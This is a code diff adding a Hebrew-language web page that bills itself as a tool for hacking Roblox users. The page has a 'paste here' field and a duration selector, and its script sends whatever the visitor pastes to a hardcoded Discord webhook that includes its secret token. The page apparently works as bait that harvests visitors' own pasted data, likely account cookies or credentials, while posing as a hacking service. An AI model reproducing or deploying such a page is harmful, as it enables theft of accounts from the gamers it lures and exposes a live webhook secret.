@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>פריצה למשתמשי רובלוקס.TURBINA</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at top, #001f3f, #000);
+            color: #00aaff;
+            text-align: center;
+            padding: 60px;
+            overflow: hidden;
+            animation: backgroundMove 10s infinite alternate linear;
+        }
+
+        @keyframes backgroundMove {
+            from {background-position: 0 0;}
+            to {background-position: 100% 100%;}
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 40px;
+            text-shadow: 0 0 20px #00aaff, 0 0 40px #0077ff;
+        }
+
+        form {
+            background-color: rgba(0, 30, 60, 0.6);
+            border: 1px solid #00aaff;
+            box-shadow: 0 0 30px #0077ff99;
+            border-radius: 20px;
+            width: 350px;
+            margin: auto;
+            padding: 25px;
+            animation: glowPulse 3s infinite alternate;
+        }
+
+        @keyframes glowPulse {
+            from { box-shadow: 0 0 15px #00aaff; }
+            to { box-shadow: 0 0 35px #00aaff; }
+        }
+
+        input, select, button {
+            display: block;
+            margin: 15px auto;
+            padding: 10px 15px;
+            font-size: 1.1em;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+        }
+
+        input, select {
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #00e0ff;
+        }
+
+        button {
+            background-color: #003366;
+            color: #00e0ff;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #0066cc;
+            box-shadow: 0 0 15px #00aaff;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>פריצה למשתמשי רובלוקס.TURBINA</h1>
+    <form onsubmit="sendForm(event)">
+        <label for="text">כאן תדביקו:</label>
+        <input type="text" id="text" placeholder="הדבק כאן..." required />
+
+        <label for="days">בחר מספר ימים:</label>
+        <select id="days">
+            <option value="1">יום 1</option>
+            <option value="3">3 ימים</option>
+            <option value="7">שבוע</option>
+        </select>
+
+        <button type="submit">שלח</button>
+    </form>
+
+    <script>
+        async function sendForm(event) {
+            event.preventDefault();
+
+            const text = document.getElementById('text').value;
+            const days = document.getElementById('days').value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1416515532160630784/wzKoQmyFJJxX2_S8Q_9f5pFaeeTMBBjQNs3ILjTPB2Cv2-DdK6zE5qHKIigSz1Yw2laA';
+
+            const content = `טקסט שנשלח: ${text}\nמספר ימים: ${days}`;
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content }),
+                });
+
+                if (response.ok) {
+                    alert('הנתונים נשלחו בהצלחה!');
+                    document.getElementById('text').value = '';
+                    document.getElementById('days').value = '1';
+                } else {
+                    alert('אירעה שגיאה בשליחת הנתונים.');
+                }
+            } catch (error) {
+                alert('אירעה תקלה בשליחת הנתונים.');
+            }
+        }
+    </script>
+
+</body>
+</html>
